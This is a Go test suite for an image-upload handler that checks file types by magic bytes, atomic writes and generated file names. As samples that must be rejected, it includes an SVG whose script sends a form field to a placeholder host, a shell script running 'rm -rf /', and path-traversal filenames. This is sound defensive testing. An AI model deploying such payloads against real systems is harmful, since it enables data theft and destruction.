package main

// The asset directory is served unauthenticated before sign-in, so what may be stored is decided by
// inspecting the bytes, never by the uploader's filename or Content-Type.

import (
	"bytes"
	"os"
	"path/filepath"
	"testing"
)

func TestAssetTypeIsDecidedByTheBytes(t *testing.T) {
	png := append([]byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A}, make([]byte, 40)...)
	jpg := append([]byte{0xFF, 0xD8, 0xFF, 0xE0}, make([]byte, 40)...)
	gif := append([]byte("GIF89a"), make([]byte, 40)...)
	webp := append(append([]byte("RIFF"), []byte{0, 0, 0, 0}...), append([]byte("WEBP"), make([]byte, 40)...)...)

	for name, b := range map[string][]byte{"png": png, "jpeg": jpg, "gif": gif, "webp": webp} {
		if ext, mime := sniffImage(b); ext == "" || mime == "" {
			t.Errorf("a real %s was not recognised", name)
		}
	}
}

// P9 L9: three bytes are not enough to call something a JPEG; the SOI must be followed by a marker segment.
func TestJPEGNeedsAMarkerAfterTheStartOfImage(t *testing.T) {
	for _, b := range [][]byte{
		append([]byte{0xFF, 0xD8, 0xFF, 0x00}, make([]byte, 40)...),
		append([]byte{0xFF, 0xD8, 0xFF, 0xFF}, make([]byte, 40)...),
		append([]byte{0xFF, 0xD8, 0xFF, '<'}, []byte("html>")...),
	} {
		if ext, _ := sniffImage(b); ext != "" {
			t.Errorf("% x... was accepted as a JPEG", b[:4])
		}
	}
	for _, m := range []byte{0xE0, 0xE1, 0xDB, 0xEE} {
		if ext, _ := sniffImage(append([]byte{0xFF, 0xD8, 0xFF, m}, make([]byte, 40)...)); ext != ".jpg" {
			t.Errorf("a JPEG starting FF D8 FF %X was not recognised", m)
		}
	}
}

// P9 L9: the stored file appears whole or not at all, and no temporary file is left behind.
func TestAssetIsWrittenAtomically(t *testing.T) {
	dir := t.TempDir()
	data := bytes.Repeat([]byte{0xAB}, 3<<20)
	if err := writeFileAtomically(dir, "0123456789abcdef.png", data, 0o644); err != nil {
		t.Fatal(err)
	}
	got, err := os.ReadFile(filepath.Join(dir, "0123456789abcdef.png"))
	if err != nil || !bytes.Equal(got, data) {
		t.Fatalf("stored file differs: %v", err)
	}
	entries, _ := os.ReadDir(dir)
	if len(entries) != 1 {
		t.Fatalf("a temporary file was left behind: %d entries", len(entries))
	}
	if fi, _ := os.Stat(filepath.Join(dir, "0123456789abcdef.png")); fi.Mode().Perm() != 0o644 {
		t.Fatalf("mode %v, want 0644 so portald can read it", fi.Mode().Perm())
	}
}

func TestAssetUploadRefusesSVG(t *testing.T) {
	// SVG must be refused: browsers execute script in it, so an uploadable SVG is stored XSS on the guest page.
	svg := []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//x/'+document.forms[0].room.value)</script></svg>`)
	if ext, _ := sniffImage(svg); ext != "" {
		t.Fatal("an SVG was accepted as an image")
	}
}

func TestAssetUploadRefusesContentThatIsNotAnImage(t *testing.T) {
	for name, b := range map[string][]byte{
		"html":          []byte(`<html><body onload="steal()">`),
		"a script":      []byte("#!/bin/sh\nrm -rf /\n"),
		"png extension": []byte("this is not a png, it just claims to be"),
		"empty":         {},
	} {
		if ext, _ := sniffImage(b); ext != "" {
			t.Errorf("%s was accepted as an image", name)
		}
	}
}

func TestStoredAssetNamesAreGeneratedNotSupplied(t *testing.T) {
	// The stored name is content-addressed, so the operator's filename (path, traversal, second extension) never reaches disk or the URL.
	for _, bad := range []string{
		"../../etc/passwd", "logo.png.sh", "a/b.png", "..\\windows\\x.png", "", "logo.svg",
	} {
		if regexpAssetName.MatchString(bad) {
			t.Errorf("%q would have been accepted as a stored asset name", bad)
		}
	}
	for _, good := range []string{"0123456789abcdef.png", "fedcba9876543210.jpg", "00112233aabbccdd.webp"} {
		if !regexpAssetName.MatchString(good) {
			t.Errorf("%q is the shape this handler generates and was rejected", good)
		}
	}
}
